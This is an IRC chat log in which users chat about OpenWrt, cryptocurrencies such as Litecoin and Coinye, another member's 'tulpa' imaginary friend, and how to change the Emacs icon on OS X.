23:23      lidstah │  yrmt: mmh, nice idea - although I first need to get used to the flash structure. I plan on putting openwrt on it for a start, as the process is well documented and should be a nice start basis to get some bsd porn on it :)
23:23        dami0 │  I had to switch keyboards just so I could type fast
23:23        dami0 │  :<

23:24        dami0 │  vypr: around 60
23:24        dami0 │  but it varies wildly
23:24         vypr │  Ah.

23:24         berk │  And my keyboard is huge

23:25        dami0 │  ^^
23:25       phyrne │  yrmt: Don't you think that's weird though? :) That it actually replaced my boot logo after an update? I'm happy haha

23:29         vypr │  Coinye
23:29        dami0 │  they're second right behind bitcoin in terms of traded worth
23:30         BigE │  what about litecoin?
23:30        dami0 │  muh bro is mining them
23:30         BigE │  or has that pretty much gotten fucked
23:30         vypr │  I like Litecoin over Bitcoin.
23:30         BigE │  why>
23:30         vypr │  Just preference, really.
23:30         BigE │  there is no difference except for the hash
23:30         vypr │  Litecoin seems simpler and smaller.
23:30         vypr │  I know.
23:30         BigE │  wat
23:30         BigE │  simpler?
23:31         vypr │  seems
23:31         BigE │  it is bitcoin code with a different hash and a less populated block chain
23:31         BigE │  i get what you mean though

23:39         BigE │  i dont know why they thought her character was worth developing
23:40         BigE │  her daughter is a better character than her, which is sad considering the total lack of screen time

01:15         jmbi │  and the forums
01:16         jmbi │  it's like shix attracts people and off-topic conversations
01:16         BigE │   that is because shix is crazy
01:16         jmbi │  l
01:17         jmbi │  it's just our hormones
01:17         jmbi │  he has multiple personalities

01:17         BigE │  who?
01:17         jmbi │  that's his alternate personality
01:18         BigE │  sure it is
01:18         jmbi │  no for real
01:18         jmbi │  remember when Amzo and him were doing that?
01:18         BigE │  my alternate personality is someone who isnt a sarcastic asshole
01:18         jmbi │  they basically created an imaginary friend
01:18         BigE │  OH YEAH
01:18         BigE │  i remember that
01:18         BigE │  that was weird
01:19         jmbi │  yeah
01:19         jmbi │  borderline schizophrenia 
01:19         jmbi │  lel
01:19         jmbi │  but anyways
01:19         jmbi │  natalie is shix's imaginary friend thingy
01:19         mxtm │  oh god what
01:19         mxtm │  ._.
01:20         jmbi │  BigE: what was it called?
01:20         jmbi │  it was some kind of practice
01:21         BigE │  fuck if i know
01:21         jmbi │  lel, i'll find it
01:21         jmbi │  but shix is almost schizo
01:21         jmbi │  he doesn't think it's that bad
01:22         jmbi │  but it's creepy
01:22         BigE │  well
01:22         BigE │  okay
01:22         BigE │  i wont judge
01:23         BigE │  i problem solve by having conversations with myself
01:23         BigE │  in my head
01:23         BigE │  not out loud
01:23         BigE │  lel
01:23         jmbi │  yeah, it's weird
01:23         jmbi │  i pm him sometimes
01:23         jmbi │  and he's like
01:23         jmbi │  "natalie wants to talk"
01:24         jmbi │  so i talk to "her" for awhile
01:24         BigE │  that is weird
01:24         jmbi │  yeah i remember Amzo started acting like that
01:24         jmbi │  "he's sitting right next to me"
01:25         BigE │  there have been studies that show that being able to talk to yourself and reason things out is a sign of a good problem solver
01:25         BigE │  but i think this goes to far
01:25         BigE │  like
01:25         BigE │  to the point of schizophrenia
01:25         jmbi │  yeah 
01:25         jmbi │  i remember researching that thing they were doing
01:25         jmbi │  and there were a lot of people who took it too far
01:26         jmbi │  TULPA!
01:26         jmbi │  that's what it was
01:26         jmbi │  tulpa
01:26         BigE │  sounds familiar
01:27         BigE │  that is just retarted
01:27        crshd │  probably pointless to ask, but does anybody have a clue how to change the emacs icon in OSX?
01:27         jmbi │  "magic formations generated by a powerful concentration of thought"
01:28         jmbi │  here's a short horror film on it: https://www.youtube.com/watch?v=-TaV3PysQUI
01:28         BigE │  crshd: ummmmm
01:28         BigE │  is emacs an app in OSX?
01:28         BigE │  or cli...
01:28         BigE │  or what?
01:29         BigE │  if it is a packaged app
01:29         BigE │  go to wherever it is installed to
01:29         BigE │  right click
01:29         BigE │  i think the list will pop up
01:29         BigE │  you click.... open package
01:29         BigE │  or something like that
01:30         BigE │  it will show you what the app actually contains
01:30         BigE │  then just look around for the icon folder
01:30         BigE │  rename
01:30         BigE │  etc
01:30         BigE │  well, rename icons
01:30         BigE │  you get the idea
01:31        crshd │  yeah, that's what i've tried
01:31        crshd │  doesn't seem to work
01:31         BigE │  hmmm
01:31         BigE │  is the app in your dock when you do this?
01:32         BigE │  cause you might have to remove it
01:32         BigE │  for the icon change to take effect
01:32        crshd │  nope, it's not
01:32         BigE │  hmmm
01:32         BigE │  HMMMMMM
01:32         BigE │  i dont know then
01:33         BigE │  there might be a plist somewhere that is using an icon that is in a different folder
01:33         BigE │  or something silly like that
